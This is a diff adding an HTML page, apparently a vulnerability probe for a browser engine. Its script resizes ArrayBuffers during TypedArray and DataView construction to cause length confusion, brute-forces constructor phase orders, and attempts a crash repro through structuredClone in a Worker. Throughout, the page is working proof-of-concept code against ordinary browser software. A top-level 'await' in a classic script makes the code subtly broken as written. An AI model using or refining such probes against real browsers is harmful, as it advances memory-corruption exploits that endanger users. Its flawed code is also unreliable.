@@ -1,0 +1,74 @@
+<!doctype html>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CTOR-PROBE</title>
+<body style="background:#000;color:#0f0;font:14px monospace;white-space:pre-wrap;margin:10px">
+<div id=o>[CTOR-PROBE] TA ctor length confusion -> Oct-27 CloneSerializer signature</div>
+<script>
+const o=document.getElementById('o');
+const log=m=>o.textContent+="\n"+m;
+window.addEventListener('error',e=>log("[ERROR] "+e.message));
+log("[*] start");
+
+// F1: ctor with resize side effects, huge legal element counts
+for(const [name,ctor,nElems] of [["u8",Uint8Array,0x80000000-1],["f64",Float64Array,0x10000000],["u32",Uint32Array,0x20000000]]){
+  try{
+    const ab=new ArrayBuffer(0x1000,{maxByteLength:0x10000});
+    let ph=0;
+    const v=new ctor(ab,
+      {valueOf(){ph++;if(ph===1){try{ab.resize(16);}catch(_){}}return 0;}},
+      {valueOf(){ph++;if(ph===2){try{ab.resize(16);}catch(_){}}return nElems;}});
+    const confused=v.length*ctor.BYTES_PER_ELEMENT>ab.byteLength;
+    log(name+": v.len="+v.length+" bytes="+(v.length*ctor.BYTES_PER_ELEMENT)+" ab="+ab.byteLength+(confused?" *** CONFUSED ***":""));
+    if(confused){
+      try{ const s=structuredClone(v); log(name+" serialize SURVIVED "+s.byteLength); }
+      catch(e){ log(name+" serialize: "+e.name); }
+    }
+  }catch(e){log(name+": "+e.name);}
+}
+
+// F2: DataView confusion
+try{
+  const ab=new ArrayBuffer(0x1000,{maxByteLength:0x10000});
+  const dv=new DataView(ab,{valueOf(){ab.resize(16);return 0;}},0x7FFFFFFF);
+  log("dataview: len="+dv.byteLength+(dv.byteLength>ab.byteLength?" *** CONFUSED ***":""));
+}catch(e){log("dataview: "+e.name);}
+
+// F3: brute force ctor phase orders
+let hits=0;
+for(let i=0;i<30000;i++){
+  const sz=256+(i%768);
+  const ab=new ArrayBuffer(sz,{maxByteLength:0x100000});
+  let ph=0;
+  const shrink=(i*7)%sz, grow=sz+((i*13)%4096);
+  try{
+    const v=new Uint8Array(ab,
+      {valueOf(){ph++;if(ph===1){try{ab.resize(shrink);}catch(_){}}else if(ph===2){try{ab.resize(grow);}catch(_){}}return (i%2)?0:sz>>1;}},
+      {valueOf(){return sz+((i*3)%8192);}});
+    if(v.length>0&&(v.byteOffset+v.length)>ab.byteLength){
+      hits++;
+      if(hits<8)log("BRUTE i="+i+" v.len="+v.length+" off="+v.byteOffset+" ab="+ab.byteLength+" *** CONFUSED ***");
+    }
+  }catch(_){}
+  if((i&0x3FF)===0&&i>0){log("BRUTE i="+i+" hits="+hits);await new Promise(r=>setTimeout(r,0));}
+}
+log("BRUTE done hits="+hits);
+
+// F4: exact crash repro attempt — confused f64 view + structuredClone from worker
+try{
+  const w=new Worker(URL.createObjectURL(new Blob([`
+onmessage=e=>{
+  const d=e.data;
+  try{ const s=structuredClone(d.view); postMessage({ok:1,len:s.byteLength}); }
+  catch(err){ postMessage({ok:0,name:err.name}); }
+};`])));
+  const ab=new ArrayBuffer(0x1000,{maxByteLength:0x10000});
+  let ph=0;
+  const v=new Float64Array(ab,
+    {valueOf(){ph++;if(ph===1)try{ab.resize(16);}catch(_){};return 0;}},
+    {valueOf(){ph++;if(ph===2)try{ab.resize(16);}catch(_){};return 0x10000000;}});
+  log("F4: f64 view bytes="+(v.length*8)+" ab="+ab.byteLength);
+  w.postMessage({view:v});
+  w.onmessage=e=>log("F4 worker: "+JSON.stringify(e.data));
+}catch(e){log("F4: "+e.name);}
+log("DONE");
+</script>
